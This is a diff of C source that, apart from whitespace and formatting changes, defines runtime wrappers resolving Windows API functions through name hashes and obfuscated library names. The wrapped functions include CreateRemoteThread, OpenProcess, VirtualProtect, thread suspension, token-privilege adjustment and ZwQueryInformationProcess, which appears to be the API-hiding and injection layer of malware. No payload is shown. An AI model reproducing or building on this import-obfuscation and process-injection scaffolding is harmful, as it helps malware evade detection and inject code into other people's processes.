@@ -710,11 +710,11 @@ BOOL cSetThreadContext(	__in		HANDLE			thread,
 DWORD WINAPI ResumeThread(
   _In_  HANDLE hThread
 );*/
-DWORD (WINAPI *f_ResumeThread)(__in HANDLE thread) = NULL;
-DWORD cResumeThread(	__in		HANDLE		thread)
+DWORD(WINAPI *f_ResumeThread)(__in HANDLE thread) = NULL;
+DWORD cResumeThread(__in		HANDLE		thread)
 {
 	if (f_ResumeThread == NULL) {
-		f_ResumeThread = (DWORD (WINAPI *)(HANDLE))resolve_function(function_hash_chain[20], deobfuscate(kernel32));
+		f_ResumeThread = (DWORD(WINAPI *)(HANDLE))resolve_function(function_hash_chain[20], deobfuscate(kernel32));
 		CHECK_VALID(f_ResumeThread);
 	}
 
@@ -728,13 +728,13 @@ DWORD WINAPI ExpandEnvironmentStrings(
   _In_       DWORD nSize
 );
 */
-DWORD (WINAPI *f_ExpandEnvironmentStringsA)(__in LPCTSTR source, __outopt LPTSTR destination, __in UINT size) = NULL;
-DWORD cExpandEnvironmentStringsA(	__in		LPCTSTR		source,
-									__outopt	LPTSTR		destination,
-									__in		UINT		size)
+DWORD(WINAPI *f_ExpandEnvironmentStringsA)(__in LPCTSTR source, __outopt LPTSTR destination, __in UINT size) = NULL;
+DWORD cExpandEnvironmentStringsA(__in		LPCTSTR		source,
+	__outopt	LPTSTR		destination,
+	__in		UINT		size)
 {
 	if (f_ExpandEnvironmentStringsA == NULL) {
-		f_ExpandEnvironmentStringsA = (DWORD (WINAPI *)(LPCTSTR, LPTSTR, UINT))resolve_function(function_hash_chain[21], deobfuscate(kernel32));
+		f_ExpandEnvironmentStringsA = (DWORD(WINAPI *)(LPCTSTR, LPTSTR, UINT))resolve_function(function_hash_chain[21], deobfuscate(kernel32));
 		CHECK_VALID(f_ExpandEnvironmentStringsA);
 	}
 
@@ -742,11 +742,11 @@ DWORD cExpandEnvironmentStringsA(	__in		LPCTSTR		source,
 }
 
 //HANDLE WINAPI GetCurrentProcess(void);
-HANDLE (WINAPI *f_GetCurrentProcess)(VOID) = NULL;
+HANDLE(WINAPI *f_GetCurrentProcess)(VOID) = NULL;
 HANDLE cGetCurrentProcess(VOID)
 {
 	if (f_GetCurrentProcess == NULL) {
-		f_GetCurrentProcess = (HANDLE (WINAPI *)(VOID))resolve_function(function_hash_chain[22], deobfuscate(kernel32));
+		f_GetCurrentProcess = (HANDLE(WINAPI *)(VOID))resolve_function(function_hash_chain[22], deobfuscate(kernel32));
 		CHECK_VALID(f_GetCurrentProcess);
 	}
 
@@ -757,11 +757,11 @@ HANDLE cGetCurrentProcess(VOID)
 PTSTR PathFindFileName(
   _In_  PTSTR pPath
 );*/
-LPSTR (WINAPI *f_PathFindFileNameA)(__in LPSTR path);
-LPSTR cPathFindFileNameA(	__in	LPSTR		path)
+LPSTR(WINAPI *f_PathFindFileNameA)(__in LPSTR path);
+LPSTR cPathFindFileNameA(__in	LPSTR		path)
 {
 	if (f_PathFindFileNameA == NULL) {
-		f_PathFindFileNameA = (LPSTR (WINAPI *)(LPSTR))resolve_function(function_hash_chain[23], deobfuscate(shlwapi));
+		f_PathFindFileNameA = (LPSTR(WINAPI *)(LPSTR))resolve_function(function_hash_chain[23], deobfuscate(shlwapi));
 		CHECK_VALID(f_PathFindFileNameA);
 	}
 
@@ -779,29 +779,29 @@ HANDLE WINAPI CreateRemoteThread(
   _Out_  LPDWORD lpThreadId
 );
 */
-HANDLE (WINAPI *f_CreateRemoteThread)(	__in		HANDLE						process,
-										__in		LPSECURITY_ATTRIBUTES		attributes,
-										__in		SIZE_T						stack_size,
-										__in		LPTHREAD_START_ROUTINE		oep,
-										__in		LPVOID						parameters,
-										__in		DWORD						flags,
-										__in		LPDWORD						thread_id) = NULL;
-HANDLE cCreateRemoteThread(		HANDLE						process,
-								LPSECURITY_ATTRIBUTES		attributes,
-								SIZE_T						stack_size,
-								LPTHREAD_START_ROUTINE		oep,
-								LPVOID						parameters,
-								DWORD						flags,
-								LPDWORD						thread_id)
+HANDLE(WINAPI *f_CreateRemoteThread)(__in		HANDLE						process,
+	__in		LPSECURITY_ATTRIBUTES		attributes,
+	__in		SIZE_T						stack_size,
+	__in		LPTHREAD_START_ROUTINE		oep,
+	__in		LPVOID						parameters,
+	__in		DWORD						flags,
+	__in		LPDWORD						thread_id) = NULL;
+HANDLE cCreateRemoteThread(HANDLE						process,
+	LPSECURITY_ATTRIBUTES		attributes,
+	SIZE_T						stack_size,
+	LPTHREAD_START_ROUTINE		oep,
+	LPVOID						parameters,
+	DWORD						flags,
+	LPDWORD						thread_id)
 {
 	if (f_CreateRemoteThread == NULL) {
-		f_CreateRemoteThread = (HANDLE (WINAPI *)(	HANDLE,
-													LPSECURITY_ATTRIBUTES,
-													SIZE_T,
-													LPTHREAD_START_ROUTINE,
-													LPVOID,
-													DWORD,
-													LPDWORD))resolve_function(function_hash_chain[24], deobfuscate(kernel32));
+		f_CreateRemoteThread = (HANDLE(WINAPI *)(HANDLE,
+			LPSECURITY_ATTRIBUTES,
+			SIZE_T,
+			LPTHREAD_START_ROUTINE,
+			LPVOID,
+			DWORD,
+			LPDWORD))resolve_function(function_hash_chain[24], deobfuscate(kernel32));
 		CHECK_VALID(f_CreateRemoteThread);
 	}
 
@@ -813,11 +813,11 @@ void WINAPI OutputDebugString(
   _In_opt_  LPCTSTR lpOutputString
 );
 */
-VOID (WINAPI *f_OutputDebugStringA)( __inopt LPCSTR string) = NULL;
+VOID(WINAPI *f_OutputDebugStringA)(__inopt LPCSTR string) = NULL;
 VOID cOutputDebugStringA(LPCSTR string)
 {
 	if (f_OutputDebugStringA == NULL) {
-		f_OutputDebugStringA = (VOID (WINAPI *)(LPCSTR))resolve_function(function_hash_chain[25], deobfuscate(kernel32));
+		f_OutputDebugStringA = (VOID(WINAPI *)(LPCSTR))resolve_function(function_hash_chain[25], deobfuscate(kernel32));
 		CHECK_VALID(f_OutputDebugStringA);
 	}
 
@@ -835,19 +835,19 @@ NTSTATUS WINAPI ZwQueryInformationProcess(
   _Out_opt_  PULONG ReturnLength
 );
 */
-NTSTATUS (WINAPI *f_ZwQueryInformationProcess)(		HANDLE				handle,
-													PROCESSINFOCLASS	info_class,
-													PVOID				process_info,
-													ULONG				process_info_length,
-													PULONG				return_length) = NULL;
-NTSTATUS cZwQueryInformationProcess(	__in		HANDLE				handle,
-										__in		PROCESSINFOCLASS	info_class,
-										__out		PVOID				process_info,
-										__in		ULONG				process_info_length,
-										__out_opt	PULONG				return_length)
+NTSTATUS(WINAPI *f_ZwQueryInformationProcess)(HANDLE				handle,
+	PROCESSINFOCLASS	info_class,
+	PVOID				process_info,
+	ULONG				process_info_length,
+	PULONG				return_length) = NULL;
+NTSTATUS cZwQueryInformationProcess(__in		HANDLE				handle,
+	__in		PROCESSINFOCLASS	info_class,
+	__out		PVOID				process_info,
+	__in		ULONG				process_info_length,
+	__out_opt	PULONG				return_length)
 {
 	if (f_ZwQueryInformationProcess == NULL) {
-		f_ZwQueryInformationProcess = (NTSTATUS (WINAPI *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))
+		f_ZwQueryInformationProcess = (NTSTATUS(WINAPI *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))
 			resolve_function(function_hash_chain[26], deobfuscate(ntdll));
 		CHECK_VALID(f_ZwQueryInformationProcess);
 	}
@@ -860,12 +860,12 @@ VOID WINAPI Sleep(
   _In_  DWORD dwMilliseconds
 );
 */
-VOID (WINAPI *f_Sleep)(DWORD time) = NULL;
+VOID(WINAPI *f_Sleep)(DWORD time) = NULL;
 VOID cSleep(__in DWORD time)
 {
 
 	if (f_Sleep == NULL) {
-		f_Sleep = (VOID (WINAPI *)(DWORD))resolve_function(function_hash_chain[27], deobfuscate(kernel32));
+		f_Sleep = (VOID(WINAPI *)(DWORD))resolve_function(function_hash_chain[27], deobfuscate(kernel32));
 		CHECK_VALID(f_Sleep);
 	}
 
@@ -880,14 +880,14 @@ HANDLE WINAPI CreateEvent(
   _In_opt_  LPCTSTR lpName
 );
 */
-HANDLE (WINAPI *f_CreateEventA)(LPSECURITY_ATTRIBUTES attributes, BOOL reset, BOOL init_state, LPCSTR name) = NULL;
-HANDLE cCreateEventA(	__in_opt	LPSECURITY_ATTRIBUTES	attributes,
-						__in		BOOL					reset,
-						__in		BOOL					init_state,
-						__in_opt	LPCSTR					name)
+HANDLE(WINAPI *f_CreateEventA)(LPSECURITY_ATTRIBUTES attributes, BOOL reset, BOOL init_state, LPCSTR name) = NULL;
+HANDLE cCreateEventA(__in_opt	LPSECURITY_ATTRIBUTES	attributes,
+	__in		BOOL					reset,
+	__in		BOOL					init_state,
+	__in_opt	LPCSTR					name)
 {
 	if (f_CreateEventA == NULL) {
-		f_CreateEventA = (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR))
+		f_CreateEventA = (HANDLE(WINAPI *)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR))
 			resolve_function(function_hash_chain[28], deobfuscate(kernel32));
 		CHECK_VALID(f_CreateEventA);
 	}
@@ -896,14 +896,14 @@ HANDLE cCreateEventA(	__in_opt	LPSECURITY_ATTRIBUTES	attributes,
 }
 
 //DWORD WINAPI GetLastError(void);
-DWORD (WINAPI *f_GetLastError)(VOID) = NULL;
+DWORD(WINAPI *f_GetLastError)(VOID) = NULL;
 DWORD cGetLastError(VOID)
 {
 	if (f_GetLastError == FALSE) {
-		f_GetLastError = (DWORD (WINAPI *)(VOID))resolve_function(function_hash_chain[29], deobfuscate(kernel32));
+		f_GetLastError = (DWORD(WINAPI *)(VOID))resolve_function(function_hash_chain[29], deobfuscate(kernel32));
 		CHECK_VALID(f_GetLastError);
 	}
-	
+
 	return f_GetLastError();
 }
 
@@ -914,13 +914,13 @@ HANDLE WINAPI OpenEvent(
   _In_  LPCTSTR lpName
 );
 */
-HANDLE (WINAPI *f_OpenEventA)(DWORD access_level, BOOL inherit_handle, LPCSTR name) = NULL;
-HANDLE cOpenEventA(	__in	DWORD		access_level,
-					__in	BOOL		inherit_handle,
-					__in	LPCSTR		name)
+HANDLE(WINAPI *f_OpenEventA)(DWORD access_level, BOOL inherit_handle, LPCSTR name) = NULL;
+HANDLE cOpenEventA(__in	DWORD		access_level,
+	__in	BOOL		inherit_handle,
+	__in	LPCSTR		name)
 {
 	if (f_OpenEventA == NULL) {
-		f_OpenEventA = (HANDLE (WINAPI *)(DWORD, BOOL, LPCSTR))
+		f_OpenEventA = (HANDLE(WINAPI *)(DWORD, BOOL, LPCSTR))
 			resolve_function(function_hash_chain[30], deobfuscate(kernel32));
 		CHECK_VALID(f_OpenEventA);
 	}
@@ -934,12 +934,12 @@ HANDLE WINAPI CreateToolhelp32Snapshot(
   _In_  DWORD th32ProcessID
 );
 */
-HANDLE (WINAPI *f_CreateToolhelp32Snapshot)(DWORD flags, DWORD pid) = NULL;
-HANDLE cCreateToolhelp32Snapshot(	__in	DWORD	flags,
-									__in	DWORD	pid)
+HANDLE(WINAPI *f_CreateToolhelp32Snapshot)(DWORD flags, DWORD pid) = NULL;
+HANDLE cCreateToolhelp32Snapshot(__in	DWORD	flags,
+	__in	DWORD	pid)
 {
 	if (f_CreateToolhelp32Snapshot == NULL) {
-		f_CreateToolhelp32Snapshot = (HANDLE (WINAPI *)(DWORD, DWORD))resolve_function(function_hash_chain[31], deobfuscate(kernel32));
+		f_CreateToolhelp32Snapshot = (HANDLE(WINAPI *)(DWORD, DWORD))resolve_function(function_hash_chain[31], deobfuscate(kernel32));
 		CHECK_VALID(f_CreateToolhelp32Snapshot);
 	}
 
@@ -952,12 +952,12 @@ BOOL WINAPI Process32First(
   _Inout_  LPPROCESSENTRY32 lppe
 );
 */
-BOOL (WINAPI *f_Process32First)(HANDLE snapshot, LPPROCESSENTRY32 lppe) = NULL;
-BOOL cProcess32First(	HANDLE				snapshot,
-						LPPROCESSENTRY32	lppe)
+BOOL(WINAPI *f_Process32First)(HANDLE snapshot, LPPROCESSENTRY32 lppe) = NULL;
+BOOL cProcess32First(HANDLE				snapshot,
+	LPPROCESSENTRY32	lppe)
 {
 	if (f_Process32First == NULL) {
-		f_Process32First = (BOOL (WINAPI *)(HANDLE, LPPROCESSENTRY32))resolve_function(function_hash_chain[32], deobfuscate(kernel32));
+		f_Process32First = (BOOL(WINAPI *)(HANDLE, LPPROCESSENTRY32))resolve_function(function_hash_chain[32], deobfuscate(kernel32));
 		CHECK_VALID(f_Process32First);
 	}
 
@@ -970,12 +970,12 @@ BOOL WINAPI Process32Next(
   _Out_  LPPROCESSENTRY32 lppe
 );
 */
-BOOL (WINAPI *f_Process32Next)(HANDLE snapshot, LPPROCESSENTRY32 lppe) = NULL;
-BOOL cProcess32Next(	__in	HANDLE				snapshot,
-						__out	LPPROCESSENTRY32	lppe)
+BOOL(WINAPI *f_Process32Next)(HANDLE snapshot, LPPROCESSENTRY32 lppe) = NULL;
+BOOL cProcess32Next(__in	HANDLE				snapshot,
+	__out	LPPROCESSENTRY32	lppe)
 {
 	if (f_Process32Next == NULL) {
-		f_Process32Next = (BOOL (WINAPI *)(HANDLE, LPPROCESSENTRY32))resolve_function(function_hash_chain[33], deobfuscate(kernel32));
+		f_Process32Next = (BOOL(WINAPI *)(HANDLE, LPPROCESSENTRY32))resolve_function(function_hash_chain[33], deobfuscate(kernel32));
 		CHECK_VALID(f_Process32Next);
 	}
 
@@ -989,13 +989,13 @@ BOOL WINAPI OpenProcessToken(
   _Out_  PHANDLE TokenHandle
 );
 */
-BOOL (WINAPI *f_OpenProcessToken)(HANDLE handle, DWORD access, PHANDLE token_handle) = NULL;
-BOOL cOpenProcessToken(	__in	HANDLE	handle,
-						__in	DWORD	access,
-						__out	PHANDLE	token_handle)
+BOOL(WINAPI *f_OpenProcessToken)(HANDLE handle, DWORD access, PHANDLE token_handle) = NULL;
+BOOL cOpenProcessToken(__in	HANDLE	handle,
+	__in	DWORD	access,
+	__out	PHANDLE	token_handle)
 {
 	if (f_OpenProcessToken == NULL) {
-		f_OpenProcessToken = (BOOL (WINAPI *)(HANDLE, DWORD, PHANDLE))resolve_function(function_hash_chain[34], deobfuscate(advapi32));
+		f_OpenProcessToken = (BOOL(WINAPI *)(HANDLE, DWORD, PHANDLE))resolve_function(function_hash_chain[34], deobfuscate(advapi32));
 		CHECK_VALID(f_OpenProcessToken);
 	}
 
@@ -1009,13 +1009,13 @@ BOOL WINAPI LookupPrivilegeValue(
   _Out_     PLUID lpLuid
 );
 */
-BOOL (WINAPI *f_LookupPrivilegeValueA)(LPCSTR system_name, LPCSTR name, PLUID uid) = NULL;
-BOOL cLookupPrivilegeValueA(	__in_opt	LPCSTR	system_name,
-								__in		LPCSTR	name,
-								__out		PLUID	uid)
+BOOL(WINAPI *f_LookupPrivilegeValueA)(LPCSTR system_name, LPCSTR name, PLUID uid) = NULL;
+BOOL cLookupPrivilegeValueA(__in_opt	LPCSTR	system_name,
+	__in		LPCSTR	name,
+	__out		PLUID	uid)
 {
 	if (f_LookupPrivilegeValueA == NULL) {
-		f_LookupPrivilegeValueA = (BOOL (WINAPI *)(LPCSTR, LPCSTR, PLUID))resolve_function(function_hash_chain[35], deobfuscate(advapi32));
+		f_LookupPrivilegeValueA = (BOOL(WINAPI *)(LPCSTR, LPCSTR, PLUID))resolve_function(function_hash_chain[35], deobfuscate(advapi32));
 		CHECK_VALID(f_LookupPrivilegeValueA);
 	}
 
@@ -1032,18 +1032,18 @@ BOOL WINAPI AdjustTokenPrivileges(
   _Out_opt_  PDWORD ReturnLength
 );
 */
-BOOL (WINAPI *f_AdjustTokenPrivileges)(HANDLE token_handle, BOOL disable_all_privileges,
-										PTOKEN_PRIVILEGES new_state, DWORD buffer_length, PTOKEN_PRIVILEGES old_state,
-										PDWORD return_length) = NULL;
-BOOL cAdjustTokenPrivileges(	__in		HANDLE				token_handle,
-								__in		BOOL				disable_all_privileges,
-								__in_opt	PTOKEN_PRIVILEGES	new_state,
-								__in		DWORD				buffer_length,
-								__out_opt	PTOKEN_PRIVILEGES	previous_state,
-								__out_opt	PDWORD				return_length)
+BOOL(WINAPI *f_AdjustTokenPrivileges)(HANDLE token_handle, BOOL disable_all_privileges,
+	PTOKEN_PRIVILEGES new_state, DWORD buffer_length, PTOKEN_PRIVILEGES old_state,
+	PDWORD return_length) = NULL;
+BOOL cAdjustTokenPrivileges(__in		HANDLE				token_handle,
+	__in		BOOL				disable_all_privileges,
+	__in_opt	PTOKEN_PRIVILEGES	new_state,
+	__in		DWORD				buffer_length,
+	__out_opt	PTOKEN_PRIVILEGES	previous_state,
+	__out_opt	PDWORD				return_length)
 {
 	if (f_AdjustTokenPrivileges == NULL) {
-		f_AdjustTokenPrivileges = (BOOL (WINAPI *)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD))
+		f_AdjustTokenPrivileges = (BOOL(WINAPI *)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD))
 			resolve_function(function_hash_chain[36], deobfuscate(advapi32));
 		CHECK_VALID(f_AdjustTokenPrivileges);
 	}
@@ -1058,13 +1058,13 @@ HANDLE WINAPI OpenProcess(
   _In_  DWORD dwProcessId
 );
 */
-HANDLE (WINAPI *f_OpenProcess)(DWORD access, BOOL inherit_handle, DWORD pid) = NULL;
-HANDLE cOpenProcess(	__in	DWORD	access,
-						__in	BOOL	inherit_handle,
-						__in	DWORD	pid)
+HANDLE(WINAPI *f_OpenProcess)(DWORD access, BOOL inherit_handle, DWORD pid) = NULL;
+HANDLE cOpenProcess(__in	DWORD	access,
+	__in	BOOL	inherit_handle,
+	__in	DWORD	pid)
 {
 	if (f_OpenProcess == NULL) {
-		f_OpenProcess = (HANDLE (WINAPI *)(DWORD, BOOL, DWORD))resolve_function(function_hash_chain[36], deobfuscate(kernel32));
+		f_OpenProcess = (HANDLE(WINAPI *)(DWORD, BOOL, DWORD))resolve_function(function_hash_chain[36], deobfuscate(kernel32));
 		CHECK_VALID(f_OpenProcess);
 	}
 
@@ -1079,15 +1079,15 @@ BOOL WINAPI VirtualProtect(
   _Out_  PDWORD lpflOldProtect
 );
 */
-BOOL (WINAPI *f_VirtualProtect)(LPVOID address, SIZE_T size, DWORD new_protect, PDWORD old_protect) = NULL;
-BOOL cVirtualProtect(	__in	LPVOID		address,
-						__in	SIZE_T		size,
-						__in	DWORD		new_protect,
-						__out	PDWORD		old_protect)
+BOOL(WINAPI *f_VirtualProtect)(LPVOID address, SIZE_T size, DWORD new_protect, PDWORD old_protect) = NULL;
+BOOL cVirtualProtect(__in	LPVOID		address,
+	__in	SIZE_T		size,
+	__in	DWORD		new_protect,
+	__out	PDWORD		old_protect)
 {
 	if (f_VirtualProtect == NULL) {
-		f_VirtualProtect = (BOOL (WINAPI *)(LPVOID, SIZE_T, DWORD, PDWORD))resolve_function
-			(function_hash_chain[37], deobfuscate(kernel32));
+		f_VirtualProtect = (BOOL(WINAPI *)(LPVOID, SIZE_T, DWORD, PDWORD))resolve_function
+		(function_hash_chain[37], deobfuscate(kernel32));
 		CHECK_VALID(f_VirtualProtect);
 	}
 
@@ -1095,11 +1095,11 @@ BOOL cVirtualProtect(	__in	LPVOID		address,
 }
 
 // DWORD WINAPI GetCurrentProcessId(void);
-DWORD (WINAPI *f_GetCurrentProcessId)(VOID) = NULL;
+DWORD(WINAPI *f_GetCurrentProcessId)(VOID) = NULL;
 DWORD cGetCurrentProcessId(VOID)
 {
 	if (f_GetCurrentProcessId == NULL) {
-		f_GetCurrentProcessId = (DWORD (WINAPI *)(VOID))resolve_function(function_hash_chain[38], deobfuscate(kernel32));
+		f_GetCurrentProcessId = (DWORD(WINAPI *)(VOID))resolve_function(function_hash_chain[38], deobfuscate(kernel32));
 		CHECK_VALID(f_GetCurrentProcessId);
 	}
 
@@ -1107,11 +1107,11 @@ DWORD cGetCurrentProcessId(VOID)
 }
 
 // DWORD WINAPI GetCurrentThreadId(void);
-DWORD (WINAPI *f_GetCurrentThreadId)(VOID) = NULL;
+DWORD(WINAPI *f_GetCurrentThreadId)(VOID) = NULL;
 DWORD cGetCurrentThreadId(VOID)
 {
 	if (f_GetCurrentThreadId == NULL) {
-		f_GetCurrentThreadId = (DWORD (WINAPI *)(VOID))resolve_function(function_hash_chain[39], deobfuscate(kernel32));
+		f_GetCurrentThreadId = (DWORD(WINAPI *)(VOID))resolve_function(function_hash_chain[39], deobfuscate(kernel32));
 		CHECK_VALID(f_GetCurrentThreadId);
 	}
 
@@ -1124,12 +1124,12 @@ BOOL WINAPI Thread32First(
   _Inout_  LPTHREADENTRY32 lpte
 );
 */
-BOOL (WINAPI *f_Thread32First)(HANDLE snapshot, LPTHREADENTRY32 thread_entry) = NULL;
-BOOL cThread32First(	__in		HANDLE			snapshot,
-						__inout		LPTHREADENTRY32	thread_entry)
+BOOL(WINAPI *f_Thread32First)(HANDLE snapshot, LPTHREADENTRY32 thread_entry) = NULL;
+BOOL cThread32First(__in		HANDLE			snapshot,
+	__inout		LPTHREADENTRY32	thread_entry)
 {
 	if (f_Thread32First == NULL) {
-		f_Thread32First = (BOOL (WINAPI *)(HANDLE, LPTHREADENTRY32))resolve_function(
+		f_Thread32First = (BOOL(WINAPI *)(HANDLE, LPTHREADENTRY32))resolve_function(
 			function_hash_chain[40], deobfuscate(kernel32));
 		CHECK_VALID(f_Thread32First);
 	}
@@ -1144,13 +1144,13 @@ HANDLE OpenThread(
   DWORD dwThreadId
 );
 */
-HANDLE (WINAPI *f_OpenThread)(DWORD access, BOOL inherit_handle, DWORD tid) = NULL;
-HANDLE cOpenThread(	__in	DWORD	access,
-					__in	BOOL	inherit_handle,
-					__in	DWORD	tid)
+HANDLE(WINAPI *f_OpenThread)(DWORD access, BOOL inherit_handle, DWORD tid) = NULL;
+HANDLE cOpenThread(__in	DWORD	access,
+	__in	BOOL	inherit_handle,
+	__in	DWORD	tid)
 {
 	if (f_OpenThread == NULL) {
-		f_OpenThread = (HANDLE (WINAPI *)(DWORD, BOOL, DWORD))resolve_function(function_hash_chain[41], deobfuscate(kernel32));
+		f_OpenThread = (HANDLE(WINAPI *)(DWORD, BOOL, DWORD))resolve_function(function_hash_chain[41], deobfuscate(kernel32));
 		CHECK_VALID(f_OpenThread);
 	}
 
@@ -1162,11 +1162,11 @@ DWORD WINAPI SuspendThread(
   _In_  HANDLE hThread
 );
 */
-DWORD (WINAPI *f_SuspendThread)(HANDLE thread) = NULL;
+DWORD(WINAPI *f_SuspendThread)(HANDLE thread) = NULL;
 DWORD cSuspendThread(__in		HANDLE	thread)
 {
 	if (f_SuspendThread == NULL) {
-		f_SuspendThread = (DWORD (WINAPI *)(HANDLE))resolve_function(function_hash_chain[42], deobfuscate(kernel32));
+		f_SuspendThread = (DWORD(WINAPI *)(HANDLE))resolve_function(function_hash_chain[42], deobfuscate(kernel32));
 		CHECK_VALID(f_SuspendThread);
 	}
 
@@ -1180,12 +1180,12 @@ BOOL WINAPI Thread32Next(
   _Out_  LPTHREADENTRY32 lpte
 );
 */
-BOOL (WINAPI *f_Thread32Next)(HANDLE snapshot, LPTHREADENTRY32 thread_entry) = NULL;
-BOOL cThread32Next(	__in	HANDLE				snapshot,
-					__out	LPTHREADENTRY32		thread_entry)
+BOOL(WINAPI *f_Thread32Next)(HANDLE snapshot, LPTHREADENTRY32 thread_entry) = NULL;
+BOOL cThread32Next(__in	HANDLE				snapshot,
+	__out	LPTHREADENTRY32		thread_entry)
 {
 	if (f_Thread32Next == NULL) {
-		f_Thread32Next = (BOOL (WINAPI *)(HANDLE, LPTHREADENTRY32))resolve_function(function_hash_chain[43], deobfuscate(kernel32));
+		f_Thread32Next = (BOOL(WINAPI *)(HANDLE, LPTHREADENTRY32))resolve_function(function_hash_chain[43], deobfuscate(kernel32));
 		CHECK_VALID(f_Thread32Next);
 	}
 
@@ -1203,12 +1203,12 @@ void WINAPI InitializeCriticalSection(
   _Out_  LPCRITICAL_SECTION lpCriticalSection
 );
 */
-VOID (WINAPI *f_InitializeCriticalSection)(LPCRITICAL_SECTION critical_section) = NULL;
+VOID(WINAPI *f_InitializeCriticalSection)(LPCRITICAL_SECTION critical_section) = NULL;
 VOID cInitializeCriticalSection(__out LPCRITICAL_SECTION critical_section)
 {
-	
+
 	if (f_InitializeCriticalSection == NULL) {
-		f_InitializeCriticalSection = (VOID (WINAPI *)(LPCRITICAL_SECTION))
+		f_InitializeCriticalSection = (VOID(WINAPI *)(LPCRITICAL_SECTION))
 			resolve_function(function_hash_chain[44], deobfuscate(ntdll));
 		CHECK_VALID(f_InitializeCriticalSection);
 	}
@@ -1223,11 +1223,11 @@ void WINAPI EnterCriticalSection(
   _Inout_  LPCRITICAL_SECTION lpCriticalSection
 );
 */
-VOID (WINAPI *f_EnterCriticalSection)(LPCRITICAL_SECTION critical_section) = NULL;
+VOID(WINAPI *f_EnterCriticalSection)(LPCRITICAL_SECTION critical_section) = NULL;
 VOID cEnterCriticalSection(__inout LPCRITICAL_SECTION critical_section)
 {
 	if (f_EnterCriticalSection == NULL) {
-		f_EnterCriticalSection = (VOID (WINAPI *)(LPCRITICAL_SECTION))
+		f_EnterCriticalSection = (VOID(WINAPI *)(LPCRITICAL_SECTION))
 			resolve_function(function_hash_chain[45], deobfuscate(ntdll));
 		CHECK_VALID(f_EnterCriticalSection);
 	}
@@ -1240,11 +1240,11 @@ void WINAPI LeaveCriticalSection(
   _Inout_  LPCRITICAL_SECTION lpCriticalSection
 );
 */
-VOID (WINAPI *f_LeaveCriticalSection)(LPCRITICAL_SECTION critical_section) = NULL;
+VOID(WINAPI *f_LeaveCriticalSection)(LPCRITICAL_SECTION critical_section) = NULL;
 VOID cLeaveCriticalSection(__inout LPCRITICAL_SECTION critical_section)
 {
 	if (f_LeaveCriticalSection == NULL) {
-		f_LeaveCriticalSection = (VOID (WINAPI *)(LPCRITICAL_SECTION))
+		f_LeaveCriticalSection = (VOID(WINAPI *)(LPCRITICAL_SECTION))
 			resolve_function(function_hash_chain[46], deobfuscate(ntdll));
 		CHECK_VALID(f_LeaveCriticalSection);
 	}
@@ -1259,13 +1259,13 @@ SIZE_T WINAPI VirtualQuery(
   _In_      SIZE_T dwLength
 );
 */
-SIZE_T (WINAPI *f_VirtualQuery)(LPCVOID address, PMEMORY_BASIC_INFORMATION mem_info, SIZE_T len) = NULL;
-SIZE_T cVirtualQuery(	__inopt	LPCVOID						address,
-						__out	PMEMORY_BASIC_INFORMATION	buffer,
-						__in	SIZE_T						len)
+SIZE_T(WINAPI *f_VirtualQuery)(LPCVOID address, PMEMORY_BASIC_INFORMATION mem_info, SIZE_T len) = NULL;
+SIZE_T cVirtualQuery(__inopt	LPCVOID						address,
+	__out	PMEMORY_BASIC_INFORMATION	buffer,
+	__in	SIZE_T						len)
 {
 	if (f_VirtualQuery == NULL) {
-		f_VirtualQuery = (SIZE_T (WINAPI *)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T))
+		f_VirtualQuery = (SIZE_T(WINAPI *)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T))
 			resolve_function(function_hash_chain[47], deobfuscate(kernel32));
 		CHECK_VALID(f_VirtualQuery);
 	}
@@ -1282,15 +1282,15 @@ BOOL WINAPI WriteFile(
   _Inout_opt_  LPOVERLAPPED lpOverlapped
 );
 */
-BOOL (WINAPI *f_WriteFile)(HANDLE file, LPCVOID buffer, DWORD size, LPDWORD written, LPOVERLAPPED overlapped) = NULL;
-BOOL cWriteFile(	__in			HANDLE				file,
-					__in			LPCVOID				buffer,
-					__in			DWORD				size,
-					__outopt		LPDWORD				written,
-					__inoutopt		LPOVERLAPPED		overlapped)
+BOOL(WINAPI *f_WriteFile)(HANDLE file, LPCVOID buffer, DWORD size, LPDWORD written, LPOVERLAPPED overlapped) = NULL;
+BOOL cWriteFile(__in			HANDLE				file,
+	__in			LPCVOID				buffer,
+	__in			DWORD				size,
+	__outopt		LPDWORD				written,
+	__inoutopt		LPOVERLAPPED		overlapped)
 {
 	if (f_WriteFile == NULL) {
-		f_WriteFile = (BOOL (WINAPI *)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))
+		f_WriteFile = (BOOL(WINAPI *)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))
 			resolve_function(function_hash_chain[48], deobfuscate(kernel32));
 		CHECK_VALID(f_WriteFile);
 	}
@@ -1306,24 +1306,24 @@ int WINAPI wvsprintf(
 );
 */
 
-INT (WINAPI *f_wvsprintfA)(LPSTR output, LPCSTR format_list, va_list list) = NULL;
+INT(WINAPI *f_wvsprintfA)(LPSTR output, LPCSTR format_list, va_list list) = NULL;
 INT cwvsprintfA(__out	LPSTR		output,
-				__in	LPCSTR		format_list,
-				__in	va_list		list)
+	__in	LPCSTR		format_list,
+	__in	va_list		list)
 {
 	if (f_wvsprintfA == NULL) {
-		f_wvsprintfA = (INT (WINAPI *)(LPSTR, LPCSTR, va_list))resolve_function(function_hash_chain[49], deobfuscate(user32));
+		f_wvsprintfA = (INT(WINAPI *)(LPSTR, LPCSTR, va_list))resolve_function(function_hash_chain[49], deobfuscate(user32));
 		CHECK_VALID(f_wvsprintfA);
 	}
 
 	return f_wvsprintfA(output, format_list, list);
 }
 
-INT (WINAPI *f_wvsprintfW)(LPTSTR output, LPCTSTR format_list, va_list list) = NULL;
+INT(WINAPI *f_wvsprintfW)(LPTSTR output, LPCTSTR format_list, va_list list) = NULL;
 INT cwvsprintfW(LPTSTR output, LPCTSTR format_list, va_list list)
 {
 	if (f_wvsprintfW == NULL) {
